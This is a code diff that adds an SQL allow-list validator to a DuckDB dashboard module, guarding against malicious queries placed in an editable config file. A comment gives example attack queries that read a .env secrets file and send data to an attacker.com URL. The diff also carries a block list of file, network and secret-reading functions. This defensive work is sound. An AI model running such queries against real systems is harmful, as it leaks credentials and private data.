@@ -29,6 +29,9 @@ from typing import Any
 
 import duckdb
 import pandas as pd
+import sqlglot
+from sqlglot import exp
+from sqlglot.errors import SqlglotError
 
 # --------------------------------------------------------------------------- #
 # Paths
@@ -121,6 +124,139 @@ def close_con() -> None:
         _con = None
 
 
+# --------------------------------------------------------------------------- #
+# SQL allow-list
+# --------------------------------------------------------------------------- #
+#
+# ``ui_config.json`` contains SQL written by the LLM, and anyone with write
+# access to that file can put arbitrary SQL in it. A read-only DuckDB connection
+# protects against writes, but not against reading files or the network:
+#
+#     SELECT * FROM read_csv('C:\Users\...\.env')
+#     SELECT * FROM read_csv('https://attacker.com/?x=' || ...)
+#
+# ``safe_sql`` closes that hole: one statement, root must be a read-only query,
+# no file/network table functions, and every referenced table must exist in the
+# database (or be a CTE alias).
+_MAX_SQL_LEN = 50_000
+
+# Statement types that are safe to execute from a dashboard.
+_RAICES_PERMITIDAS = tuple(
+    getattr(exp, nombre)
+    for nombre in ("Select", "Union", "Intersect", "Except", "Subquery",
+                   "Describe", "Show", "Values")
+    if hasattr(exp, nombre)
+)
+
+# Anything that writes, attaches, installs extensions or runs OS commands.
+_NODOS_PROHIBIDOS = tuple(
+    getattr(exp, nombre)
+    for nombre in ("Insert", "Update", "Delete", "Drop", "Create", "Alter",
+                   "Attach", "Detach", "Copy", "Pragma", "Install", "Load",
+                   "Command", "Use", "Set", "Transaction", "Merge", "Grant",
+                   "Export", "Import", "Refresh", "Cache", "Uncache")
+    if hasattr(exp, nombre)
+)
+
+# Table functions that touch the filesystem or the network.
+_FUNCIONES_PROHIBIDAS = {
+    "glob", "query", "query_table", "sniff_csv", "getvariable", "getenv",
+    "sqlite_attach", "sqlite_scan", "postgres_scan", "mysql_scan",
+    "iceberg_scan", "delta_scan", "which_secret", "read_xlsx",
+}
+
+
+def _nombre_funcion(nodo: exp.Func) -> str:
+    """Best-effort lowercase name of a function node (Anonymous uses ``name``)."""
+    if isinstance(nodo, exp.Anonymous):
+        return str(nodo.name or "").lower()
+    return str(nodo.sql_name() or "").lower()
+
+
+def safe_sql(sql: str, tablas: set[str] | None = None) -> str | None:
+    """Validate *sql* before running it.
+
+    Returns ``None`` when the query is safe, or a short reason (in Spanish,
+    ready to show in the UI) when it is not.
+
+    This is a defence-in-depth check, not a full SQL sandbox: it blocks
+    multi-statement SQL, writes/DDL/ATTACH, file & network table functions and
+    tables that don't exist in the database. Combined with the read-only
+    connection, that covers the realistic attack surface of an editable
+    ``ui_config.json``.
+
+    Args:
+        sql: Query to validate.
+        tablas: Tables allowed in this query. Defaults to the tables present in
+            the database; pass an explicit set in tests.
+    """
+    if not isinstance(sql, str) or not sql.strip():
+        return "La consulta está vacía."
+
+    if len(sql) > _MAX_SQL_LEN:
+        return "La consulta es demasiado larga."
+
+    try:
+        statements = sqlglot.parse(sql, read="duckdb")
+    except SqlglotError as exc:
+        return f"SQL no válido: {str(exc).splitlines()[0][:160]}"
+
+    statements = [s for s in statements if s is not None]
+    if not statements:
+        return "La consulta está vacía."
+    if len(statements) > 1:
+        return "Solo se permite una sentencia SQL por consulta."
+
+    tree = statements[0]
+
+    if not isinstance(tree, _RAICES_PERMITIDAS):
+        return f"Solo se permiten consultas de lectura (SELECT). Tipo detectado: {type(tree).__name__}."
+
+    for nodo in tree.walk():
+        if isinstance(nodo, _NODOS_PROHIBIDOS):
+            return f"Operación no permitida: {type(nodo).__name__.upper()}."
+
+    for nodo in tree.find_all(exp.Func):
+        nombre = _nombre_funcion(nodo)
+        if nombre.startswith("read_") or nombre.endswith("_scan") or nombre in _FUNCIONES_PROHIBIDAS:
+            return f"Función no permitida: {nombre}() (acceso a archivos o red)."
+
+    # Tables must exist in the database (CTE aliases are fine).
+    alias_cte = {str(cte.alias).lower() for cte in tree.find_all(exp.CTE)}
+    referenciadas: set[str] = set()
+    for tabla in tree.find_all(exp.Table):
+        if isinstance(tabla.this, exp.Func):
+            # Already covered by the function check above.
+            continue
+        if tabla.catalog:
+            return f"Acceso a catálogo no permitido: {tabla.catalog}."
+        if tabla.db and str(tabla.db).lower() != "main":
+            return f"Acceso a esquema no permitido: {tabla.db}."
+        nombre = str(tabla.name or "")
+        if nombre and nombre.lower() not in alias_cte:
+            referenciadas.add(nombre)
+
+    if referenciadas:
+        disponibles = {t.lower() for t in tablas} if tablas is not None else None
+        if disponibles is None:
+            try:
+                disponibles = {t.lower() for t in tablas_disponibles()}
+            except Exception:
+                disponibles = set()
+        if disponibles:
+            no_encontradas = referenciadas - disponibles
+            if no_encontradas:
+                return (
+                    "La consulta usa tablas que no existen: "
+                    + ", ".join(sorted(no_encontradas))
+                    + ". Disponibles: "
+                    + ", ".join(sorted(disponibles))
+                    + "."
+                )
+
+    return None
+
+
 _ULTIMO_ERROR: str | None = None
 _ERROR_SEQ = 0
 
@@ -151,6 +287,18 @@ def ejecutar(
 
     if not DB_PATH.exists():
         return pd.DataFrame()
+
+    motivo = safe_sql(sql)
+    if motivo is not None:
+        _ULTIMO_ERROR = f"SQL bloqueado: {motivo}"
+        _ERROR_SEQ += 1
+        _logger.warning(
+            "Query blocked: %s | SQL: %s",
+            motivo,
+            " ".join(str(sql).split())[:300],
+        )
+        return pd.DataFrame()
+
     con = _open_con(read_only=True)
     try:
         df = con.execute(sql, params or {}).df()
